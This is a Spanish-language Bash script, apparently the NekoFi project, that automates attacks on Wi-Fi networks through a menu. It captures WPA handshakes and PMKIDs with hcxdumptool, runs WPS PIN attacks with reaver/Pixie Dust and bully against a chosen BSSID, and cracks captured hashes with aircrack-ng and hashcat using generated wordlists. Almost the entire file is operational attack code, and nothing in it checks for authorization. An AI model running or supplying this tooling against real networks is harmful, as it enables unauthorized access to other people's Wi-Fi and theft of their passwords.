#!/usr/bin/env bash
# ==============================================================================
# NekoFi.sh - Framework Automatizado de Auditoría y Pentesting Wi-Fi
# Autor: rodrigo47363 (https://github.com/rodrigo47363/NekoFi)
# Versión: 2.0 (Refactored & Modernized)
# ==============================================================================

# Colores de Terminal
CLR_RED="\033[31m"
CLR_GREEN="\033[32m"
CLR_YELLOW="\033[33m"
CLR_CYAN="\033[36m"
CLR_BLUE="\033[34m"
CLR_RESET="\033[0m"
CLR_BOLD="\033[1m"

REPO_URL="https://github.com/rodrigo47363/NekoFi/raw/main/NekoFi.sh"
SCRIPT_NAME="NekoFi.sh"
LOCAL_PATH="/usr/local/bin/$SCRIPT_NAME"

# Lista de herramientas requeridas
TOOLS=(
    iw aircrack-ng xterm tmux iproute2 pciutils usbutils rfkill wget ethtool
    hashcat reaver hcxdumptool john pixiewps bully cowpatty crunch wash
    hcxtools wifite macchanger hostapd dnsmasq lighttpd
)

selected_interface=""
monitor_interface=""

verificar_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${CLR_YELLOW}[!] Este script requiere permisos de superusuario (root). Solicitando sudo...${CLR_RESET}"
        exec sudo bash "$0" "$@"
    fi
}

install_tools() {
    echo -e "${CLR_CYAN}[*] Verificando dependencias del sistema...${CLR_RESET}"
    local missing_tools=()
    for tool in "${TOOLS[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            missing_tools+=("$tool")
        fi
    done

    if [ ${#missing_tools[@]} -gt 0 ]; then
        echo -e "${CLR_YELLOW}[!] Instalando herramientas faltantes: ${missing_tools[*]}${CLR_RESET}"
        apt-get update -qq || true
        if ! apt-get install -y "${missing_tools[@]}"; then
            echo -e "${CLR_RED}[-] Error instalando paquetes. Verifica tus repositorios o conexión.${CLR_RESET}"
        else
            echo -e "${CLR_GREEN}[✔] Herramientas instaladas correctamente.${CLR_RESET}"
        fi
    else
        echo -e "${CLR_GREEN}[✔] Todas las dependencias están disponibles.${CLR_RESET}"
    fi
}

detect_interfaces() {
    echo -e "\n${CLR_CYAN}[*] Detectando interfaces de red inalámbricas...${CLR_RESET}"
    local ifaces=()
    
    # 1. Intentar detección vía iw dev
    if command -v iw &>/dev/null; then
        while read -r line; do
            [ -n "$line" ] && ifaces+=("$line")
        done < <(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}')
    fi

    # 2. Fallback vía ip link
    if [ ${#ifaces[@]} -eq 0 ]; then
        while read -r line; do
            [ -n "$line" ] && ifaces+=("$line")
        done < <(ip -o link show 2>/dev/null | awk -F': ' '{print $2}' | grep -E '^wl')
    fi

    if [ ${#ifaces[@]} -eq 0 ]; then
        echo -e "${CLR_RED}[-] No se detectaron interfaces Wi-Fi compatibles en el sistema.${CLR_RESET}"
        read -p "Ingrese manualmente el nombre de la interfaz (ej. wlan0): " manual_iface
        selected_interface="${manual_iface:-wlan0}"
    else
        echo -e "Interfaces detectadas:"
        for i in "${!ifaces[@]}"; do
            echo -e "  [${CLR_GREEN}$i${CLR_RESET}] ${ifaces[$i]}"
        done
        read -p "Seleccione el índice de la interfaz [0]: " idx
        idx="${idx:-0}"
        selected_interface="${ifaces[$idx]:-${ifaces[0]}}"
    fi

    monitor_interface="$selected_interface"
    echo -e "${CLR_GREEN}[+] Interfaz seleccionada: ${CLR_BOLD}$selected_interface${CLR_RESET}"
}

kill_interfering_processes() {
    echo -e "${CLR_YELLOW}[*] Deteniendo procesos que pueden interferir con el modo monitor...${CLR_RESET}"
    airmon-ng check kill >/dev/null 2>&1 || true
}

poner_modo_monitor() {
    local channel="${1:-}"
    kill_interfering_processes
    echo -e "${CLR_CYAN}[*] Poniendo $selected_interface en modo monitor...${CLR_RESET}"
    
    # Intentar activación directa por iw
    ip link set "$selected_interface" down 2>/dev/null || true
    iw "$selected_interface" set type monitor 2>/dev/null || true
    ip link set "$selected_interface" up 2>/dev/null || true
    
    # Validar si está en modo monitor
    local current_mode
    current_mode=$(iw dev "$selected_interface" info 2>/dev/null | awk '/type/{print $2}')
    if [ "$current_mode" != "monitor" ]; then
        airmon-ng start "$selected_interface" $channel >/dev/null 2>&1 || true
        if ip link show "${selected_interface}mon" &>/dev/null; then
            monitor_interface="${selected_interface}mon"
        else
            monitor_interface="$selected_interface"
        fi
    else
        monitor_interface="$selected_interface"
    fi
    
    if [ -n "$channel" ]; then
        iw dev "$monitor_interface" set channel "$channel" 2>/dev/null || true
    fi
    echo -e "${CLR_GREEN}[+] Interfaz lista en modo monitor: ${CLR_BOLD}$monitor_interface${CLR_RESET}"
}

poner_modo_managed() {
    echo -e "${CLR_CYAN}[*] Restaurando interfaz a modo Managed...${CLR_RESET}"
    airmon-ng stop "$monitor_interface" >/dev/null 2>&1 || true
    ip link set "$selected_interface" down 2>/dev/null || true
    iw "$selected_interface" set type managed 2>/dev/null || true
    ip link set "$selected_interface" up 2>/dev/null || true
    systemctl restart NetworkManager 2>/dev/null || true
    echo -e "${CLR_GREEN}[+] Modo managed restaurado en $selected_interface.${CLR_RESET}"
}

escaneo_redes() {
    poner_modo_monitor
    echo -e "${CLR_CYAN}[*] Iniciando escaneo de puntos de acceso WPS (Wash)...${CLR_RESET}"
    echo -e "${CLR_YELLOW}[i] Presione Ctrl+C para detener el escaneo cuando localice su objetivo.${CLR_RESET}\n"
    wash -i "$monitor_interface" || true
}

capturar_handshake_pmkid() {
    poner_modo_monitor
    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    local pcap_file="capture_${timestamp}.pcapng"
    local hash_file="pmkid_${timestamp}.22000"

    echo -e "${CLR_CYAN}[*] Capturando PMKID / Handshakes con hcxdumptool...${CLR_RESET}"
    echo -e "${CLR_YELLOW}[i] Presione Ctrl+C cuando haya capturado suficientes paquetes.${CLR_RESET}\n"
    
    # Compatibilidad con flags modernas y legacy de hcxdumptool
    if hcxdumptool --help 2>&1 | grep -q -- '-w'; then
        hcxdumptool -i "$monitor_interface" -w "$pcap_file" --rds=1 || true
    else
        hcxdumptool -i "$monitor_interface" -o "$pcap_file" --enable_status=1 || true
    fi

    if [ -f "$pcap_file" ] && [ -s "$pcap_file" ]; then
        echo -e "\n${CLR_CYAN}[*] Extrayendo hashes WPA/WPA2/PMKID con hcxtools...${CLR_RESET}"
        if command -v hcxpcapngtool &>/dev/null; then
            hcxpcapngtool -o "$hash_file" "$pcap_file" 2>/dev/null || true
        elif command -v hcxpcaptool &>/dev/null; then
            hcxpcaptool -z "$hash_file" "$pcap_file" 2>/dev/null || true
        fi

        if [ -s "$hash_file" ]; then
            echo -e "${CLR_GREEN}${CLR_BOLD}[✔] ¡Hashes capturados con éxito!${CLR_RESET}"
            echo -e "Archivo de hashes guardado en: ${CLR_CYAN}$hash_file${CLR_RESET}"
            echo -e "Formato: Hashcat modo 22000"
            echo -e "--------------------------------------------------------"
            cat "$hash_file"
            echo -e "--------------------------------------------------------"
        else
            echo -e "${CLR_YELLOW}[!] No se detectaron PMKIDs ni Handshakes completos en la captura.${CLR_RESET}"
        fi
    fi
}

ataque_wps_reaver() {
    escaneo_redes
    echo
    read -p "Ingrese el BSSID objetivo: " bssid
    read -p "Ingrese el canal del AP (1-14): " canal
    if [ -n "$bssid" ]; then
        poner_modo_monitor "$canal"
        echo -e "${CLR_CYAN}[*] Ejecutando ataque WPS con Reaver sobre $bssid...${CLR_RESET}"
        reaver -i "$monitor_interface" -b "$bssid" -c "$canal" -vv -K 1 || true
    fi
}

ataque_wps_bully() {
    escaneo_redes
    echo
    read -p "Ingrese el BSSID objetivo: " bssid
    read -p "Ingrese el canal del AP (1-14): " canal
    if [ -n "$bssid" ]; then
        poner_modo_monitor "$canal"
        echo -e "${CLR_CYAN}[*] Ejecutando ataque WPS con Bully sobre $bssid...${CLR_RESET}"
        bully -b "$bssid" -c "$canal" -d -v 3 "$monitor_interface" || true
    fi
}

ataque_wpa() {
    echo -e "${CLR_CYAN}[*] Ataque de diccionario WPA/WPA2 offline (Aircrack-ng)...${CLR_RESET}"
    read -p "Ruta del archivo de captura (.cap / .pcap): " capture_file
    read -p "BSSID objetivo: " bssid
    read -p "Ruta del diccionario de contraseñas: " wordlist_file

    if [ ! -f "$capture_file" ]; then
        echo -e "${CLR_RED}[-] Archivo de captura no encontrado.${CLR_RESET}"
        return
    fi
    if [ ! -f "$wordlist_file" ]; then
        echo -e "${CLR_RED}[-] Diccionario no encontrado.${CLR_RESET}"
        return
    fi

    if [ -n "$bssid" ]; then
        aircrack-ng -w "$wordlist_file" -b "$bssid" "$capture_file"
    else
        aircrack-ng -w "$wordlist_file" "$capture_file"
    fi
}

crackear_hashcat() {
    echo -e "${CLR_CYAN}[*] Crackeo de Hashes con Hashcat (Modo unificado 22000: WPA/WPA2/PMKID)...${CLR_RESET}"
    read -p "Ruta del archivo de hashes (.22000 / .hc22000 / .16800): " hash_file
    read -p "Ruta del diccionario (ej: /usr/share/wordlists/rockyou.txt): " wordlist_file

    if [ ! -f "$hash_file" ] || [ ! -f "$wordlist_file" ]; then
        echo -e "${CLR_RED}[-] Archivo de hashes o diccionario no válido.${CLR_RESET}"
        return
    fi

    echo -e "${CLR_GREEN}[+] Iniciando Hashcat...${CLR_RESET}"
    hashcat -m 22000 -a 0 "$hash_file" "$wordlist_file" -w 3 || hashcat -m 16800 -a 0 "$hash_file" "$wordlist_file" -w 3
}

crear_diccionario_crunch() {
    echo -e "${CLR_CYAN}[*] Generador de Diccionarios con Crunch...${CLR_RESET}"
    read -p "Longitud mínima: " min_len
    read -p "Longitud máxima: " max_len
    read -p "Conjunto de caracteres (ej: 0123456789 o dejar vacío): " charset
    read -p "Nombre del archivo de salida: " output_file

    if [ -n "$min_len" ] && [ -n "$max_len" ]; then
        if [ -n "$charset" ]; then
            crunch "$min_len" "$max_len" "$charset" -o "$output_file"
        else
            crunch "$min_len" "$max_len" -o "$output_file"
        fi
        echo -e "${CLR_GREEN}[✔] Diccionario generado con éxito: $output_file${CLR_RESET}"
    fi
}

crear_diccionario_cowpatty() {
    echo -e "${CLR_CYAN}[*] Generador de Tablas Precalculadas PMK (Cowpatty)...${CLR_RESET}"
    read -p "Ruta del diccionario base de palabras: " wordlist
    read -p "ESSID de la red objetivo: " essid
    read -p "Nombre del archivo hash de salida: " output_file

    if [ -f "$wordlist" ] && [ -n "$essid" ]; then
        cowpatty -f "$wordlist" -s "$essid" -o "$output_file"
    else
        echo -e "${CLR_RED}[-] Diccionario o ESSID inválido.${CLR_RESET}"
    fi
}

actualizar_script() {
    echo -e "${CLR_CYAN}[*] Actualizando NekoFi.sh desde GitHub...${CLR_RESET}"
    if wget -q -O /tmp/NekoFi.sh "$REPO_URL"; then
        sudo cp /tmp/NekoFi.sh "$LOCAL_PATH"
        sudo chmod +x "$LOCAL_PATH"
        echo -e "${CLR_GREEN}[✔] NekoFi.sh actualizado correctamente en $LOCAL_PATH.${CLR_RESET}"
    else
        echo -e "${CLR_RED}[-] Error descargando la actualización desde $REPO_URL.${CLR_RESET}"
    fi
    rm -f /tmp/NekoFi.sh
}

mostrar_menu() {
    clear
    echo -e "${CLR_CYAN}${CLR_BOLD}"
    cat << "EOF"
########################################################
#                                                      #
#                  NekoFi.sh                           #
#                  Versión 2.0 (Refactored)            #
#                                                      #
#  GitHub: https://github.com/rodrigo47363/NekoFi      #
#  Autor:  rodrigo47363                                #
########################################################
EOF
    echo -e "${CLR_RESET}"
    echo -e "  Interfaz activa: ${CLR_GREEN}${CLR_BOLD}${selected_interface}${CLR_RESET} | Modo: ${CLR_YELLOW}${monitor_interface}${CLR_RESET}\n"
    echo -e "  [${CLR_GREEN}1${CLR_RESET}]  Escanear redes Wi-Fi (Wash / WPS)"
    echo -e "  [${CLR_GREEN}2${CLR_RESET}]  Capturar Handshake / PMKID (hcxdumptool)"
    echo -e "  [${CLR_GREEN}3${CLR_RESET}]  Ataque WPS con Reaver / PixieWPS"
    echo -e "  [${CLR_GREEN}4${CLR_RESET}]  Ataque WPS con Bully"
    echo -e "  [${CLR_GREEN}5${CLR_RESET}]  Ataque WPA/WPA2 por Diccionario (Aircrack-ng)"
    echo -e "  [${CLR_GREEN}6${CLR_RESET}]  Crackear contraseñas con Hashcat (Modo 22000)"
    echo -e "  [${CLR_GREEN}7${CLR_RESET}]  Crear diccionario con Crunch"
    echo -e "  [${CLR_GREEN}8${CLR_RESET}]  Crear tabla PMK con Cowpatty"
    echo -e "  [${CLR_GREEN}9${CLR_RESET}]  Poner interfaz en modo Monitor"
    echo -e "  [${CLR_GREEN}10${CLR_RESET}] Poner interfaz en modo Managed"
    echo -e "  [${CLR_GREEN}11${CLR_RESET}] Cambiar / Redetectar interfaz Wi-Fi"
    echo -e "  [${CLR_GREEN}12${CLR_RESET}] Actualizar NekoFi.sh desde GitHub"
    echo -e "  [${CLR_RED}0${CLR_RESET}]  Salir"
    echo
}

main() {
    verificar_root "$@"
    install_tools
    detect_interfaces

    while true; do
        mostrar_menu
        read -p "Seleccione una opción: " opcion
        case "$opcion" in
            1) escaneo_redes ;;
            2) capturar_handshake_pmkid ;;
            3) ataque_wps_reaver ;;
            4) ataque_wps_bully ;;
            5) ataque_wpa ;;
            6) crackear_hashcat ;;
            7) crear_diccionario_crunch ;;
            8) crear_diccionario_cowpatty ;;
            9) poner_modo_monitor ;;
            10) poner_modo_managed ;;
            11) detect_interfaces ;;
            12) actualizar_script ;;
            0) 
               poner_modo_managed
               echo -e "${CLR_GREEN}[+] Saliendo de NekoFi.sh. ¡Hasta la próxima!${CLR_RESET}"
               exit 0 
               ;;
            *) echo -e "${CLR_RED}[!] Opción no válida.${CLR_RESET}" ;;
        esac
        echo
        read -p "Presione Enter para continuar..." _
    done
}

main "$@"

